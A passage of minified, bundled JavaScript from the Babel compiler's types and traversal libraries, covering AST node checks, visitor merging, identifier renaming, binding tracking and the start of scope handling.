J.right===X;case"LabeledStatement":return!1;case"CatchClause":return!1;case"RestElement":return!1;case"BreakStatement":case"ContinueStatement":return!1;case"FunctionDeclaration":case"FunctionExpression":return!1;case"ExportNamespaceSpecifier":case"ExportDefaultSpecifier":return!1;case"ExportSpecifier":if(Q!=null&&Q.source)return!1;return J.local===X;case"ImportDefaultSpecifier":case"ImportNamespaceSpecifier":case"ImportSpecifier":return!1;case"ImportAttribute":return!1;case"JSXAttribute":return!1;case"ObjectPattern":case"ArrayPattern":return!1;case"MetaProperty":return!1;case"ObjectTypeProperty":return J.key!==X;case"TSEnumMember":return J.id!==X;case"TSPropertySignature":if(J.key===X)return!!J.computed;return!0}return!0}});var $q=v((zq)=>{Object.defineProperty(zq,"__esModule",{value:!0});zq.default=m$1;var xX=F0();function m$1(X,J){if((0,xX.isBlockStatement)(X)&&((0,xX.isFunction)(J)||(0,xX.isCatchClause)(J)))return!1;if((0,xX.isPattern)(X)&&((0,xX.isFunction)(J)||(0,xX.isCatchClause)(J)))return!0;return(0,xX.isScopable)(X)}});var Uq=v((Kq)=>{Object.defineProperty(Kq,"__esModule",{value:!0});Kq.default=c$1;var Vq=F0();function c$1(X){return(0,Vq.isImportDefaultSpecifier)(X)||(0,Vq.isIdentifier)(X.imported||X.exported,{name:"default"})}});var qq=v((Zq)=>{Object.defineProperty(Zq,"__esModule",{value:!0});Zq.default=i$1;var p$1=c8(),d$1=new Set(["abstract","boolean","byte","char","double","enum","final","float","goto","implements","int","interface","long","native","package","private","protected","public","short","static","synchronized","throws","transient","volatile"]);function i$1(X){return(0,p$1.default)(X)&&!d$1.has(X)}});var Mq=v((Bq)=>{Object.defineProperty(Bq,"__esModule",{value:!0});Bq.default=n$1;var a$1=F0();mY=Symbol.for("var used to be block scoped");var mY;function n$1(X){return(0,a$1.isVariableDeclaration)(X,{kind:"var"})&&!X[mY]}});var Oq=v((jq)=>{Object.defineProperty(jq,"__esModule",{value:!0});jq.default=Y4;var o$1=z7(),hX=F0(),uY=K9(),cY=DY(),t$1=zX();function Y4(X,J){let Q=[],Y=!0;for(let W of X){if(!(0,hX.isEmptyStatement)(W))Y=!1;if((0,hX.isExpression)(W))Q.push(W);else if((0,hX.isExpressionStatement)(W))Q.push(W.expression);else if((0,hX.isVariableDeclaration)(W)){if(W.kind!=="var")return;for(let G of W.declarations){let H=(0,o$1.default)(G);for(let z of Object.keys(H))J.push({kind:W.kind,id:(0,t$1.default)(H[z])});if(G.init)Q.push((0,uY.assignmentExpression)("=",G.id,G.init))}Y=!0}else if((0,hX.isIfStatement)(W)){let G=W.consequent?Y4([W.consequent],J):(0,cY.buildUndefinedNode)(),H=W.alternate?Y4([W.alternate],J):(0,cY.buildUndefinedNode)();if(!G||!H)return;Q.push((0,uY.conditionalExpression)(W.test,G,H))}else if((0,hX.isBlockStatement)(W)){let G=Y4(W.body,J);if(!G)return;Q.push(G)}else if((0,hX.isEmptyStatement)(W)){if(X.indexOf(W)===0)Y=!0}else return}if(Y)Q.push((0,cY.buildUndefinedNode)());if(Q.length===1)return Q[0];else return(0,uY.sequenceExpression)(Q)}});var Rq=v((Fq)=>{Object.defineProperty(Fq,"__esModule",{value:!0});Fq.default=JV1;var XV1=Oq();function JV1(X,J){if(!(X!=null&&X.length))return;let Q=[],Y=(0,XV1.default)(X,Q);if(!Y)return;for(let W of Q)J.push(W);return Y}});var y1=v((Y1)=>{Object.defineProperty(Y1,"__esModule",{value:!0});var $X={react:!0,assertNode:!0,createTypeAnnotationBasedOnTypeof:!0,createUnionTypeAnnotation:!0,createFlowUnionType:!0,createTSUnionType:!0,cloneNode:!0,clone:!0,cloneDeep:!0,cloneDeepWithoutLoc:!0,cloneWithoutLoc:!0,addComment:!0,addComments:!0,inheritInnerComments:!0,inheritLeadingComments:!0,inheritsComments:!0,inheritTrailingComments:!0,removeComments:!0,ensureBlock:!0,toBindingIdentifierName:!0,toBlock:!0,toComputedKey:!0,toExpression:!0,toIdentifier:!0,toKeyAlias:!0,toStatement:!0,valueToNode:!0,appendToMemberExpression:!0,inherits:!0,prependToMemberExpression:!0,removeProperties:!0,removePropertiesDeep:!0,removeTypeDuplicates:!0,getAssignmentIdentifiers:!0,getBindingIdentifiers:!0,getOuterBindingIdentifiers:!0,getFunctionName:!0,traverse:!0,traverseFast:!0,shallowEqual:!0,is:!0,isBinding:!0,isBlockScoped:!0,isImmutable:!0,isLet:!0,isNode:!0,isNodesEquivalent:!0,isPlaceholderType:!0,isReferenced:!0,isScope:!0,isSpecifierDefault:!0,isType:!0,isValidES3Identifier:!0,isValidIdentifier:!0,isVar:!0,matchesPattern:!0,validate:!0,buildMatchMemberExpression:!0,__internal__deprecationWarning:!0};Object.defineProperty(Y1,"__internal__deprecationWarning",{enumerable:!0,get:function(){return HK1.default}});Object.defineProperty(Y1,"addComment",{enumerable:!0,get:function(){return BV1.default}});Object.defineProperty(Y1,"addComments",{enumerable:!0,get:function(){return MV1.default}});Object.defineProperty(Y1,"appendToMemberExpression",{enumerable:!0,get:function(){return _V1.default}});Object.defineProperty(Y1,"assertNode",{enumerable:!0,get:function(){return HV1.default}});Object.defineProperty(Y1,"buildMatchMemberExpression",{enumerable:!0,get:function(){return GK1.default}});Object.defineProperty(Y1,"clone",{enumerable:!0,get:function(){return KV1.default}});Object.defineProperty(Y1,"cloneDeep",{enumerable:!0,get:function(){return UV1.default}});Object.defineProperty(Y1,"cloneDeepWithoutLoc",{enumerable:!0,get:function(){return ZV1.default}});Object.defineProperty(Y1,"cloneNode",{enumerable:!0,get:function(){return VV1.default}});Object.defineProperty(Y1,"cloneWithoutLoc",{enumerable:!0,get:function(){return qV1.default}});Object.defineProperty(Y1,"createFlowUnionType",{enumerable:!0,get:function(){return Aq.default}});Object.defineProperty(Y1,"createTSUnionType",{enumerable:!0,get:function(){return $V1.default}});Object.defineProperty(Y1,"createTypeAnnotationBasedOnTypeof",{enumerable:!0,get:function(){return zV1.default}});Object.defineProperty(Y1,"createUnionTypeAnnotation",{enumerable:!0,get:function(){return Aq.default}});Object.defineProperty(Y1,"ensureBlock",{enumerable:!0,get:function(){return DV1.default}});Object.defineProperty(Y1,"getAssignmentIdentifiers",{enumerable:!0,get:function(){return xV1.default}});Object.defineProperty(Y1,"getBindingIdentifiers",{enumerable:!0,get:function(){return hV1.default}});Object.defineProperty(Y1,"getFunctionName",{enumerable:!0,get:function(){return gV1.default}});Object.defineProperty(Y1,"getOuterBindingIdentifiers",{enumerable:!0,get:function(){return yV1.default}});Object.defineProperty(Y1,"inheritInnerComments",{enumerable:!0,get:function(){return jV1.default}});Object.defineProperty(Y1,"inheritLeadingComments",{enumerable:!0,get:function(){return OV1.default}});Object.defineProperty(Y1,"inheritTrailingComments",{enumerable:!0,get:function(){return RV1.default}});Object.defineProperty(Y1,"inherits",{enumerable:!0,get:function(){return EV1.default}});Object.defineProperty(Y1,"inheritsComments",{enumerable:!0,get:function(){return FV1.default}});Object.defineProperty(Y1,"is",{enumerable:!0,get:function(){return cV1.default}});Object.defineProperty(Y1,"isBinding",{enumerable:!0,get:function(){return lV1.default}});Object.defineProperty(Y1,"isBlockScoped",{enumerable:!0,get:function(){return pV1.default}});Object.defineProperty(Y1,"isImmutable",{enumerable:!0,get:function(){return dV1.default}});Object.defineProperty(Y1,"isLet",{enumerable:!0,get:function(){return iV1.default}});Object.defineProperty(Y1,"isNode",{enumerable:!0,get:function(){return rV1.default}});Object.defineProperty(Y1,"isNodesEquivalent",{enumerable:!0,get:function(){return aV1.default}});Object.defineProperty(Y1,"isPlaceholderType",{enumerable:!0,get:function(){return nV1.default}});Object.defineProperty(Y1,"isReferenced",{enumerable:!0,get:function(){return sV1.default}});Object.defineProperty(Y1,"isScope",{enumerable:!0,get:function(){return oV1.default}});Object.defineProperty(Y1,"isSpecifierDefault",{enumerable:!0,get:function(){return tV1.default}});Object.defineProperty(Y1,"isType",{enumerable:!0,get:function(){return eV1.default}});Object.defineProperty(Y1,"isValidES3Identifier",{enumerable:!0,get:function(){return XK1.default}});Object.defineProperty(Y1,"isValidIdentifier",{enumerable:!0,get:function(){return JK1.default}});Object.defineProperty(Y1,"isVar",{enumerable:!0,get:function(){return QK1.default}});Object.defineProperty(Y1,"matchesPattern",{enumerable:!0,get:function(){return YK1.default}});Object.defineProperty(Y1,"prependToMemberExpression",{enumerable:!0,get:function(){return kV1.default}});Y1.react=void 0;Object.defineProperty(Y1,"removeComments",{enumerable:!0,get:function(){return AV1.default}});Object.defineProperty(Y1,"removeProperties",{enumerable:!0,get:function(){return bV1.default}});Object.defineProperty(Y1,"removePropertiesDeep",{enumerable:!0,get:function(){return vV1.default}});Object.defineProperty(Y1,"removeTypeDuplicates",{enumerable:!0,get:function(){return fV1.default}});Object.defineProperty(Y1,"shallowEqual",{enumerable:!0,get:function(){return uV1.default}});Object.defineProperty(Y1,"toBindingIdentifierName",{enumerable:!0,get:function(){return wV1.default}});Object.defineProperty(Y1,"toBlock",{enumerable:!0,get:function(){return NV1.default}});Object.defineProperty(Y1,"toComputedKey",{enumerable:!0,get:function(){return LV1.default}});Object.defineProperty(Y1,"toExpression",{enumerable:!0,get:function(){return IV1.default}});Object.defineProperty(Y1,"toIdentifier",{enumerable:!0,get:function(){return CV1.default}});Object.defineProperty(Y1,"toKeyAlias",{enumerable:!0,get:function(){return PV1.default}});Object.defineProperty(Y1,"toStatement",{enumerable:!0,get:function(){return SV1.default}});Object.defineProperty(Y1,"traverse",{enumerable:!0,get:function(){return W4.default}});Object.defineProperty(Y1,"traverseFast",{enumerable:!0,get:function(){return mV1.default}});Object.defineProperty(Y1,"validate",{enumerable:!0,get:function(){return WK1.default}});Object.defineProperty(Y1,"valueToNode",{enumerable:!0,get:function(){return TV1.default}});var YV1=pV(),WV1=iV(),GV1=KU(),HV1=qU(),lY=MU();Object.keys(lY).forEach(function(X){if(X==="default"||X==="__esModule")return;if(Object.prototype.hasOwnProperty.call($X,X))return;if(X in Y1&&Y1[X]===lY[X])return;Object.defineProperty(Y1,X,{enumerable:!0,get:function(){return lY[X]}})});var zV1=FU(),Aq=NU(),$V1=TU(),pY=DY();Object.keys(pY).forEach(function(X){if(X==="default"||X==="__esModule")return;if(Object.prototype.hasOwnProperty.call($X,X))return;if(X in Y1&&Y1[X]===pY[X])return;Object.defineProperty(Y1,X,{enumerable:!0,get:function(){return pY[X]}})});var dY=K9();Object.keys(dY).forEach(function(X){if(X==="default"||X==="__esModule")return;if(Object.prototype.hasOwnProperty.call($X,X))return;if(X in Y1&&Y1[X]===dY[X])return;Object.defineProperty(Y1,X,{enumerable:!0,get:function(){return dY[X]}})});var VV1=zX(),KV1=yU(),UV1=mU(),ZV1=cU(),qV1=pU(),BV1=rU(),MV1=NY(),jV1=LY(),OV1=IY(),FV1=PY(),RV1=CY(),AV1=XZ(),iY=YZ();Object.keys(iY).forEach(function(X){if(X==="default"||X==="__esModule")return;if(Object.prototype.hasOwnProperty.call($X,X))return;if(X in Y1&&Y1[X]===iY[X])return;Object.defineProperty(Y1,X,{enumerable:!0,get:function(){return iY[X]}})});var rY=l8();Object.keys(rY).forEach(function(X){if(X==="default"||X==="__esModule")return;if(Object.prototype.hasOwnProperty.call($X,X))return;if(X in Y1&&Y1[X]===rY[X])return;Object.defineProperty(Y1,X,{enumerable:!0,get:function(){return rY[X]}})});var DV1=HZ(),wV1=VZ(),NV1=TY(),LV1=UZ(),IV1=BZ(),CV1=_Y(),PV1=NZ(),SV1=CZ(),TV1=TZ(),aY=I9();Object.keys(aY).forEach(function(X){if(X==="default"||X==="__esModule")return;if(Object.prototype.hasOwnProperty.call($X,X))return;if(X in Y1&&Y1[X]===aY[X])return;Object.defineProperty(Y1,X,{enumerable:!0,get:function(){return aY[X]}})});var _V1=EZ(),EV1=vZ(),kV1=xZ(),bV1=kY(),vV1=bY(),fV1=AY(),xV1=yZ(),hV1=z7(),yV1=cZ(),gV1=dZ(),W4=rZ();Object.keys(W4).forEach(function(X){if(X==="default"||X==="__esModule")return;if(Object.prototype.hasOwnProperty.call($X,X))return;if(X in Y1&&Y1[X]===W4[X])return;Object.defineProperty(Y1,X,{enumerable:!0,get:function(){return W4[X]}})});var mV1=EY(),uV1=l5(),cV1=u8(),lV1=nZ(),pV1=eZ(),dV1=Jq(),iV1=yY(),rV1=RY(),aV1=Wq(),nV1=n2(),sV1=Hq(),oV1=$q(),tV1=Uq(),eV1=p5(),XK1=qq(),JK1=c8(),QK1=Mq(),YK1=r2(),WK1=a5(),GK1=a2(),nY=F0();Object.keys(nY).forEach(function(X){if(X==="default"||X==="__esModule")return;if(Object.prototype.hasOwnProperty.call($X,X))return;if(X in Y1&&Y1[X]===nY[X])return;Object.defineProperty(Y1,X,{enumerable:!0,get:function(){return nY[X]}})});var HK1=m8(),zK1=Rq(),Nn1=Y1.react={isReactComponent:YV1.default,isCompatTag:WV1.default,buildChildren:GV1.default};Y1.toSequenceExpression=zK1.default;if(process.env.BABEL_TYPES_8_BREAKING)console.warn("BABEL_TYPES_8_BREAKING is not supported anymore. Use the latest Babel 8.0.0 pre-release instead!")});var oY=v((Lq)=>{Object.defineProperty(Lq,"__esModule",{value:!0});Lq.isBindingIdentifier=_K1;Lq.isBlockScoped=fK1;Lq.isExpression=kK1;Lq.isFlow=mK1;Lq.isForAwaitStatement=lK1;Lq.isGenerated=yK1;Lq.isPure=gK1;Lq.isReferenced=vK1;Lq.isReferencedIdentifier=SK1;Lq.isReferencedMemberExpression=TK1;Lq.isRestProperty=uK1;Lq.isScope=bK1;Lq.isSpreadProperty=cK1;Lq.isStatement=EK1;Lq.isUser=hK1;Lq.isVar=xK1;var $K1=y1(),{isBinding:VK1,isBlockScoped:KK1,isExportDeclaration:UK1,isExpression:ZK1,isFlow:qK1,isForStatement:BK1,isForXStatement:MK1,isIdentifier:wq,isImportDeclaration:jK1,isImportSpecifier:OK1,isJSXIdentifier:FK1,isJSXMemberExpression:RK1,isMemberExpression:AK1,isRestElement:Nq,isReferenced:sY,isScope:DK1,isStatement:wK1,isVar:NK1,isVariableDeclaration:LK1,react:IK1,isForOfStatement:CK1}=$K1,{isCompatTag:PK1}=IK1;function SK1(X){let{node:J,parent:Q}=this;if(!wq(J,X)&&!RK1(Q,X))if(FK1(J,X)){if(PK1(J.name))return!1}else return!1;return sY(J,Q,this.parentPath.parent)}function TK1(){let{node:X,parent:J}=this;return AK1(X)&&sY(X,J)}function _K1(){let{node:X,parent:J}=this,Q=this.parentPath.parent;return wq(X)&&VK1(X,J,Q)}function EK1(){let{node:X,parent:J}=this;if(wK1(X)){if(LK1(X)){if(MK1(J,{left:X}))return!1;if(BK1(J,{init:X}))return!1}return!0}else return!1}function kK1(){if(this.isIdentifier())return this.isReferencedIdentifier();else return ZK1(this.node)}function bK1(){return DK1(this.node,this.parent)}function vK1(){return sY(this.node,this.parent)}function fK1(){return KK1(this.node)}function xK1(){return NK1(this.node)}function hK1(){return this.node&&!!this.node.loc}function yK1(){return!this.isUser()}function gK1(X){return this.scope.isPure(this.node,X)}function mK1(){let{node:X}=this;if(qK1(X))return!0;else if(jK1(X))return X.importKind==="type"||X.importKind==="typeof";else if(UK1(X))return X.exportKind==="type";else if(OK1(X))return X.importKind==="type"||X.importKind==="typeof";else return!1}function uK1(){var X;return Nq(this.node)&&((X=this.parentPath)==null?void 0:X.isObjectPattern())}function cK1(){var X;return Nq(this.node)&&((X=this.parentPath)==null?void 0:X.isObjectExpression())}function lK1(){return CK1(this.node,{await:!0})}Lq.isExistentialTypeParam=function(){throw Error("`path.isExistentialTypeParam` has been renamed to `path.isExistsTypeAnnotation()` in Babel 7.")},Lq.isNumericLiteralTypeAnnotation=function(){throw Error("`path.isNumericLiteralTypeAnnotation()` has been renamed to `path.isNumberLiteralTypeAnnotation()` in Babel 7.")}});var G4=v((yq)=>{Object.defineProperty(yq,"__esModule",{value:!0});yq.environmentVisitor=qU1;yq.explode=fq;yq.isExplodedVisitor=vq;yq.merge=hq;yq.verify=xq;var bq=c2(),HU1=oY(),zU1=y1(),Iq=l9(),{DEPRECATED_KEYS:Cq,DEPRECATED_ALIASES:Pq,FLIPPED_ALIAS_KEYS:Sq,TYPES:$U1,__internal__deprecationWarning:Tq}=zU1;function VU1(X){return X in bq}function vq(X){return X==null?void 0:X._exploded}function fq(X){if(vq(X))return X;X._exploded=!0;for(let J of Object.keys(X)){if(yX(J))continue;let Q=J.split("|");if(Q.length===1)continue;let Y=X[J];delete X[J];for(let W of Q)X[W]=Y}xq(X),delete X.__esModule,KU1(X),kq(X);for(let J of Object.keys(X)){if(yX(J))continue;if(!VU1(J))continue;let Q=X[J];for(let W of Object.keys(Q))Q[W]=UU1(J,Q[W]);delete X[J];let Y=bq[J];if(Y!==null)for(let W of Y)if(X[W])$7(X[W],Q);else X[W]=Q;else $7(X,Q)}for(let J of Object.keys(X)){if(yX(J))continue;let Q=Sq[J];if(J in Cq){let W=Cq[J];Tq(J,W,"Visitor "),Q=[W]}else if(J in Pq){let W=Pq[J];Tq(J,W,"Visitor "),Q=Sq[W]}if(!Q)continue;let Y=X[J];delete X[J];for(let W of Q){let G=X[W];if(G)$7(G,Y);else X[W]=Object.assign({},Y)}}for(let J of Object.keys(X)){if(yX(J))continue;kq(X[J])}return X}function xq(X){if(X._verified)return;if(typeof X==="function")throw Error("You passed `traverse()` a function when it expected a visitor object, are you sure you didn't mean `{ enter: Function }`?");for(let J of Object.keys(X)){if(J==="enter"||J==="exit")_q(J,X[J]);if(yX(J))continue;if(!$U1.includes(J))throw Error(`You gave us a visitor for the node type ${J} but it's not a valid type in @babel/traverse 7.28.3`);let Q=X[J];if(typeof Q==="object")for(let Y of Object.keys(Q))if(Y==="enter"||Y==="exit")_q(`${J}.${Y}`,Q[Y]);else throw Error(`You passed \`traverse()\` a visitor object with the property ${J} that has the invalid property ${Y}`)}X._verified=!0}function _q(X,J){let Q=[].concat(J);for(let Y of Q)if(typeof Y!=="function")throw TypeError(`Non-function found defined in ${X} with type ${typeof Y}`)}function hq(X,J=[],Q){let Y={_verified:!0,_exploded:!0};Object.defineProperty(Y,"_exploded",{enumerable:!1}),Object.defineProperty(Y,"_verified",{enumerable:!1});for(let W=0;W<X.length;W++){let G=fq(X[W]),H=J[W],z=G;if(H||Q)z=Eq(z,H,Q);$7(Y,z);for(let $ of Object.keys(G)){if(yX($))continue;let V=G[$];if(H||Q)V=Eq(V,H,Q);let K=Y[$]||(Y[$]={});$7(K,V)}}return Y}function Eq(X,J,Q){let Y={};for(let W of["enter","exit"]){let G=X[W];if(!Array.isArray(G))continue;G=G.map(function(H){let z=H;if(J)z=function($){H.call(J,$,J)};if(Q)z=Q(J==null?void 0:J.key,W,z);if(z!==H)z.toString=()=>H.toString();return z}),Y[W]=G}return Y}function KU1(X){for(let J of Object.keys(X)){if(yX(J))continue;let Q=X[J];if(typeof Q==="function")X[J]={enter:Q}}}function kq(X){if(X.enter&&!Array.isArray(X.enter))X.enter=[X.enter];if(X.exit&&!Array.isArray(X.exit))X.exit=[X.exit]}function UU1(X,J){let Q=`is${X}`,Y=HU1[Q],W=function(G){if(Y.call(G))return J.apply(this,arguments)};return W.toString=()=>J.toString(),W}function yX(X){if(X[0]==="_")return!0;if(X==="enter"||X==="exit"||X==="shouldSkip")return!0;if(X==="denylist"||X==="noScope"||X==="skipKeys")return!0;if(X==="blacklist")return!0;return!1}function $7(X,J){for(let Q of["enter","exit"]){if(!J[Q])continue;X[Q]=[].concat(X[Q]||[],J[Q])}}var ZU1={FunctionParent(X){if(X.isArrowFunctionExpression())return;if(X.skip(),X.isMethod())if(!X.requeueComputedKeyAndDecorators)Iq.requeueComputedKeyAndDecorators.call(X);else X.requeueComputedKeyAndDecorators()},Property(X){if(X.isObjectProperty())return;if(X.skip(),!X.requeueComputedKeyAndDecorators)Iq.requeueComputedKeyAndDecorators.call(X);else X.requeueComputedKeyAndDecorators()}};function qU1(X){return hq([ZU1,X])}});var cq=v((mq)=>{Object.defineProperty(mq,"__esModule",{value:!0});mq.default=void 0;var H4=y1(),RU1=H4,AU1=z4(),DU1=G4(),wU1=l9(),{getAssignmentIdentifiers:NU1}=RU1,LU1={ReferencedIdentifier({node:X},J){if(X.name===J.oldName)X.name=J.newName},Scope(X,J){if(!X.scope.bindingIdentifierEquals(J.oldName,J.binding.identifier)){if(X.skip(),X.isMethod())if(!X.requeueComputedKeyAndDecorators)wU1.requeueComputedKeyAndDecorators.call(X);else X.requeueComputedKeyAndDecorators()}},ObjectProperty({node:X,scope:J},Q){let{name:Y}=X.key;if(X.shorthand&&(Y===Q.oldName||Y===Q.newName)&&J.getBindingIdentifier(Y)===Q.binding.identifier){X.shorthand=!1;{var W;if((W=X.extra)!=null&&W.shorthand)X.extra.shorthand=!1}}},"AssignmentExpression|Declaration|VariableDeclarator"(X,J){if(X.isVariableDeclaration())return;let Q=X.isAssignmentExpression()?NU1(X.node):X.getOuterBindingIdentifiers();for(let Y in Q)if(Y===J.oldName)Q[Y].name=J.newName}};class gq{constructor(X,J,Q){this.newName=Q,this.oldName=J,this.binding=X}maybeConvertFromExportDeclaration(X){let J=X.parentPath;if(!J.isExportDeclaration())return;if(J.isExportDefaultDeclaration()){let{declaration:Q}=J.node;if(H4.isDeclaration(Q)&&!Q.id)return}if(J.isExportAllDeclaration())return;J.splitExportDeclaration()}maybeConvertFromClassFunctionDeclaration(X){return X}maybeConvertFromClassFunctionExpression(X){return X}rename(){let{binding:X,oldName:J,newName:Q}=this,{scope:Y,path:W}=X,G=W.find(($)=>$.isDeclaration()||$.isFunctionExpression()||$.isClassExpression());if(G){if(G.getOuterBindingIdentifiers()[J]===X.identifier)this.maybeConvertFromExportDeclaration(G)}let H=arguments[0]||Y.block,z={discriminant:!0};if(H4.isMethod(H)){if(H.computed)z.key=!0;if(!H4.isObjectMethod(H))z.decorators=!0}if((0,AU1.traverseNode)(H,(0,DU1.explode)(LU1),Y,this,Y.path,z),!arguments[0])Y.removeOwnBinding(J),Y.bindings[Q]=X,this.binding.identifier.name=Q;if(G)this.maybeConvertFromClassFunctionDeclaration(W),this.maybeConvertFromClassFunctionExpression(W)}}mq.default=gq});var iq=v((pq)=>{Object.defineProperty(pq,"__esModule",{value:!0});pq.default=void 0;class lq{constructor({identifier:X,scope:J,path:Q,kind:Y}){if(this.identifier=void 0,this.scope=void 0,this.path=void 0,this.kind=void 0,this.constantViolations=[],this.constant=!0,this.referencePaths=[],this.referenced=!1,this.references=0,this.identifier=X,this.scope=J,this.path=Q,this.kind=Y,(Y==="var"||Y==="hoisted")&&IU1(Q))this.reassign(Q);this.clearValue()}deoptValue(){this.clearValue(),this.hasDeoptedValue=!0}setValue(X){if(this.hasDeoptedValue)return;this.hasValue=!0,this.value=X}clearValue(){this.hasDeoptedValue=!1,this.hasValue=!1,this.value=null}reassign(X){if(this.constant=!1,this.constantViolations.includes(X))return;this.constantViolations.push(X)}reference(X){if(this.referencePaths.includes(X))return;this.referenced=!0,this.references++,this.referencePaths.push(X)}dereference(){this.references--,this.referenced=!!this.references}}pq.default=lq;function IU1(X){let J=!X.isVariableDeclarator()||X.node.init;for(let{parentPath:Q,key:Y}=X;Q;{parentPath:Q,key:Y}=Q){if(Q.isFunctionParent())return!1;if(Y==="left"&&Q.isForXStatement()||J&&Y==="body"&&Q.isLoop())return!0}return!1}});var gX=v((nq)=>{Object.defineProperty(nq,"__esModule",{value:!0});nq.clear=PU1;nq.clearPath=rq;nq.clearScope=aq;nq.getCachedPaths=SU1;nq.getOrCreateCachedPaths=TU1;nq.scope=nq.path=void 0;var $4=nq.path=new WeakMap,CU1=nq.scope=new WeakMap;function PU1(){rq(),aq()}function rq(){nq.path=$4=new WeakMap}function aq(){nq.scope=CU1=new WeakMap}function SU1(X){let{parent:J,parentPath:Q}=X;return $4.get(J)}function TU1(X,J){let Q=$4.get(X);if(!Q)$4.set(X,Q=new Map);return Q}});var oq=v((bn1,fU1)=>{fU1.exports=["decodeURI","decodeURIComponent","encodeURI","encodeURIComponent","escape","eval","globalThis","isFinite","isNaN","parseFloat","parseInt","undefined","unescape"]});var tq=v((vn1,xU1)=>{xU1.exports=["AggregateError","Array","ArrayBuffer","Atomics","BigInt","BigInt64Array","BigUint64Array","Boolean","DataView","Date","Error","EvalError","FinalizationRegistry","Float16Array","Float32Array","Float64Array","Function","Infinity","Int16Array","Int32Array","Int8Array","Intl","Iterator","JSON","Map","Math","NaN","Number","Object","Promise","Proxy","RangeError","ReferenceError","Reflect","RegExp","Set","SharedArrayBuffer","String","Symbol","SyntaxError","TypeError","Uint16Array","Uint32Array","Uint8Array","Uint8ClampedArray","URIError","WeakMap","WeakRef","WeakSet"]});var QW=v((BB)=>{Object.defineProperty(BB,"__esModule",{value:!0});BB.default=void 0;var hU1=cq(),zB=K7(),yU1=iq(),$B=y1(),VB=$B,eq=gX(),gU1=oq(),mU1=tq(),{assignmentExpression:uU1,callExpression:XB,cloneNode:JB,getBindingIdentifiers:KB,identifier:uX,isArrayExpression:UB,isBinary:cU1,isCallExpression:QB,isClass:lU1,isClassBody:pU1,isClassDeclaration:dU1,isExportAllDeclaration:ZB,isExportDefaultDeclaration:iU1,isExportNamedDeclaration:eY,isFunctionDeclaration:rU1,isIdentifier:mX,isImportDeclaration:XW,isLiteral:aU1,isMemberExpression:nU1,isMethod:sU1,isModuleSpecifier:oU1,isNullLiteral:tU1,isObjectExpression:eU1,isProperty:XZ1,isPureish:JZ1,isRegExpLiteral:QZ1,isSuper:YZ1,isTaggedTemplateExpression:WZ1,isTemplateLiteral:qB,isThisExpression:YB,isUnaryExpression:GZ1,isVariableDeclaration:HZ1,expressionStatement:zZ1,matchesPattern:WB,memberExpression:JW,numericLiteral:$Z1,toIdentifier:VZ1,variableDeclaration:KZ1,variableDeclarator:UZ1,isRecordExpression:ZZ1,isTupleExpression:qZ1,isObjectProperty:BZ1,isTopicReference:GB,isMetaProperty:MZ1,isPrivateName:jZ1,isExportDeclaration:OZ1,buildUndefinedNode:FZ1,sequenceExpression:RZ1}=$B;function K0(X,J){switch(X==null?void 0:X.type){default:if(XW(X)||OZ1(X)){var Q;if((ZB(X)||eY(X)||XW(X))&&X.source)K0(X.source,J);else if((eY(X)||XW(X))&&(Q=X.specifiers)!=null&&Q.length)for(let Y of X.specifiers)K0(Y,J);else if((iU1(X)||eY(X))&&X.declaration)K0(X.declaration,J)}else if(oU1(X))K0(X.local,J);else if(aU1(X)&&!tU1(X)&&!QZ1(X)&&!qB(X))J.push(X.value);break;case"MemberExpression":case"OptionalMemberExpression":case"JSXMemberExpression":K0(X.object,J),K0(X.property,J);break;case"Identifier":case"JSXIdentifier":J.push(X.name);break;case"CallExpression":case"OptionalCallExpression":case"NewExpression":K0(X.callee,J);break;case"ObjectExpression":case"ObjectPattern":for(let Y of X.properties)K0(Y,J);break;case"SpreadElement":case"RestElement":K0(X.argument,J);break;case"ObjectProperty":case"ObjectMethod":case"ClassProperty":case"ClassMethod":case"ClassPrivateProperty":case"ClassPrivateMethod":K0(X.key,J);break;case"ThisExpression":J.push("this");break;case"Super":J.push("super");break;case"Import":case"ImportExpression":J.push("import");break;case"DoExpression":J.push("do");break;case"YieldExpression":J.push("yield"),K0(X.argument,J);break;case"AwaitExpression":J.push("await"),K0(X.argument,J);break;case"AssignmentExpression":K0(X.left,J);break;case"VariableDeclarator":K0(X.id,J);break;case"FunctionExpression":case"FunctionDeclaration":case"ClassExpression":case"ClassDeclaration":K0(X.id,J);break;case"PrivateName":K0(X.id,J);break;case"ParenthesizedExpression":K0(X.expression,J);break;case"UnaryExpression":case"UpdateExpression":K0(X.argument,J);break;case"MetaProperty":K0(X.meta,J),K0(X.property,J);break;case"JSXElement":K0(X.openingElement,J);break;case"JSXOpeningElement":K0(X.name,J);break;case"JSXFragment":K0(X.openingFragment,J);break;case"JSXOpeningFragment":J.push("Fragment");break;case"JSXNamespacedName":K0(X.namespace,J),K0(X.name,J);break}}function HB(X){X.references=Object.create(null),X.uids=Object.create(null),X.bindings=Object.create(null),X.globals=Object.create(null)}V4=Symbol.for("should not be considered a local binding");var V4,AZ1={ForStatement(X){let J=X.get("init");if(J.isVar()){let{scope:Q}=X;(Q.getFunctionParent()||Q.getProgramParent()).registerBinding("var",J)}},Declaration(X){if(X.isBlockScoped())return;if(X.isImportDeclaration())return;if(X.isExportDeclaration())return;(X.scope.getFunctionParent()||X.scope.getProgramParent()).registerDeclaration(X)},ImportDeclaration(X){X.scope.getBlockParent().registerDeclaration(X)},TSImportEqualsDeclaration(X){X.scope.getBlockParent().registerDeclaration(X)},ReferencedIdentifier(X,J){if(VB.isTSQualifiedName(X.parent)&&X.parent.right===X.node)return;if(X.parentPath.isTSImportEqualsDeclaration())return;J.references.push(X)},ForXStatement(X,J){let Q=X.get("left");if(Q.isPattern()||Q.isIdentifier())J.constantViolations.push(X);else if(Q.isVar()){let{scope:Y}=X;(Y.getFunctionParent()||Y.getProgramParent()).registerBinding("var",Q)}},ExportDeclaration:{exit(X){let{node:J,scope:Q}=X;if(ZB(J))return;let Y=J.declaration;if(dU1(Y)||rU1(Y)){let W=Y.id;if(!W)return;let G=Q.getBinding(W.name);G==null||G.reference(X)}else if(HZ1(Y))for(let W of Y.declarations)for(let G of Object.keys(KB(W))){let H=Q.getBinding(G);H==null||H.reference(X)}}},LabeledStatement(X){X.scope.getBlockParent().registerDeclaration(X)},AssignmentExpression(X,J){J.assignments.push(X)},UpdateExpression(X,J){J.constantViolations.push(X)},UnaryExpression(X,J){if(X.node.operator==="delete")J.constantViolations.push(X)},BlockScoped(X){let J=X.scope;if(J.path===X)J=J.parent;if(J.getBlockParent().registerDeclaration(X),X.isClassDeclaration()&&X.node.id){let 